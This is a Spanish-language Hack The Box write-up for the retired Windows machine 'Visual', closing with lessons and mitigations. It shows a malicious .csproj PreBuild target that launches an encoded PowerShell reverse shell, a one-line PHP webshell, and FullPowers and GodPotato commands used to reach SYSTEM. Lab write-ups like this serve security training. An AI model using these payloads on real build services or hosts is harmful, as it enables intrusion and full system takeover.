---
machine: Visual
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, web, git, dotnet, fullpowers, godpotato, privesc]
---

# Visual — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La web compila proyectos de Visual Studio enviados como URL de Git. El servicio clona el repositorio con `git`, permite elegir la rama y ejecuta `msbuild` sobre el `.sln`. Un `.csproj` con un `PreBuildEvent` o un target `BeforeTargets="PreBuildEvent"` ejecuta comandos durante la compilación. Se aloja un proyecto .NET 6 malicioso en un Gitea propio y se envía su URL; el comando PowerShell devuelve una shell como `enox`. `enox` puede escribir en `C:\xampp\htdocs`, así que se deja una webshell PHP que corre como `NT AUTHORITY\LOCAL SERVICE`, con `SeImpersonate` deshabilitado. `FullPowers` restaura los privilegios de servicio y `GodPotato` los usa para obtener `SYSTEM`.

## Reconocimiento

```bash
nmap -Pn -sCV -p80 <IP>
```

- `80` Apache 2.4.56 Win64, OpenSSL 1.1.1t, PHP 8.1.17.
- XAMPP; `uploads`, `assets`, `css`, `js` y `submit.php`.

La web permite introducir una URL de repositorio. El servidor intenta clonarla y muestra el estado en `/uploads/<hash>/`; el proyecto debe contener un `.sln`.

## Enumeración

Al enviar una URL propia se recibe una petición `GET /test/info/refs?service=git-upload-pack` con `User-Agent: git/2.41.0.windows.1`. El servidor usa Git sobre HTTP.

Se levanta un Gitea local y se crea un proyecto .NET 6 de prueba. El sitio clona el repositorio, ejecuta `msbuild` y devuelve los binarios generados en `/uploads/<hash>/`. El código de `compile.ps1` en la home de `enox` confirma que el proceso lee `C:\xampp\htdocs\uploads\todo.txt` y compila con `msbuild.exe`.

## Foothold

Un proyecto de Visual Studio permite eventos anteriores y posteriores a la compilación. En `.csproj` se añade:

```xml
<Target Name="PreBuild" BeforeTargets="PreBuildEvent">
  <Exec Command="powershell -e <BASE64_REVERSE_SHELL>" />
</Target>
```

También funciona `<PreBuildEvent>calc.exe</PreBuildEvent>`. Se publica el repositorio en Gitea, se envía su URL y, tras la compilación, llega una shell como `visual\enox`.

## Movimiento lateral

`enox` puede escribir en `C:\xampp\htdocs`. Se crea una webshell con `Set-Content` (no con `echo`, que genera UTF-16 y XAMPP no ejecuta):

```powershell
Set-Content -Path C:\xampp\htdocs\pwn.php -Value '<?php system($_REQUEST["cmd"]); ?>'
```

La webshell corre como `NT AUTHORITY\LOCAL SERVICE`. `whoami /priv` muestra solo `SeChangeNotify`, `SeCreateGlobal` y `SeIncreaseWorkingSet`; `SeImpersonate` está ausente.

## Escalada de privilegios

`FullPowers.exe` crea una tarea programada como `LOCAL SERVICE` y recupera el token completo, incluido `SeImpersonate`:

```powershell
.\FullPowers.exe -c "whoami /priv"
.\FullPowers.exe -c "powershell -e <BASE64_REVERSE_SHELL>"
```

La nueva shell tiene `SeImpersonate`, `SeAssignPrimaryToken` y `SeIncreaseQuota`. `GodPotato` abusa de DCOM/RPC para impersonar un token de `SYSTEM`:

```powershell
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "powershell -e <BASE64_REVERSE_SHELL>"
```

La segunda orden devuelve una shell como `NT AUTHORITY\SYSTEM`.

## Evidencia

- Petición `git-upload-pack` al servidor atacante.
- Repositorio clonado y compilado en `/uploads/<hash>/`.
- `.csproj` con `PreBuild`/`PreBuildEvent`.
- Shell como `visual\enox`.
- Webshell en `C:\xampp\htdocs` como `LOCAL SERVICE`.
- `FullPowers` mostrando `SeImpersonate` y `GodPotato` ejecutando `whoami` como `SYSTEM`.

## Lecciones aprendidas

- Compilar código de un usuario es ejecutar código: MSBuild permite comandos en eventos y targets.
- Un servicio que clona repositorios debe tratar el proyecto como no confiable.
- `LOCAL SERVICE` puede tener un token reducido; `FullPowers` recupera privilegios de servicio.
- `SeImpersonate` sigue siendo un puente habitual a `SYSTEM` en Windows.
- La codificación de PowerShell importa al escribir webshells PHP.

## Mitigaciones y detección

- No compilar proyectos de usuarios en el host; usar contenedores efímeros sin red ni secretos.
- Bloquear `Exec`, `PreBuildEvent` y `PostBuildEvent` en los `.csproj` o revisar el proyecto antes de compilar.
- Ejecutar el servicio de compilación con una cuenta de bajo privilegio y sin acceso al webroot.
- Aplicar least privilege a `LOCAL SERVICE` y monitorizar `FullPowers`, tareas programadas y `GodPotato`.
- Detectar `git-upload-pack` hacia hosts externos, `msbuild` con proyectos nuevos y webshells en `htdocs`.

## Referencias

- [0xdf — Visual](https://0xdf.gitlab.io/2024/02/24/htb-visual.html)
- [IppSec — Visual](https://www.youtube.com/watch?v=ZJDefj0K9Jw)
- [Hack The Box — Visual](https://app.hackthebox.com/machines/visual)
